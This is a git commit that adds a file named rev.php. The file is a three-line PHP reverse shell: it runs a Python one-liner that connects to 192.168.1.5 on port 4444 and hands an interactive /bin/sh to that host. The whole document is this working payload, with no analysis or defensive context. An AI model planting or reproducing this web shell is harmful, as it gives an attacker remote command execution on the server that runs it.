bdf6ccea9c4a81d43eaa52417073229e1b03290e
ShellBypassID <kangunben5@gmail.com>
2026-02-17 18:53:40 +0800

    Create rev.php

---
+++ rev.php
@@ -0,0 +1,3 @@
+<?php
+system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'');
+?>
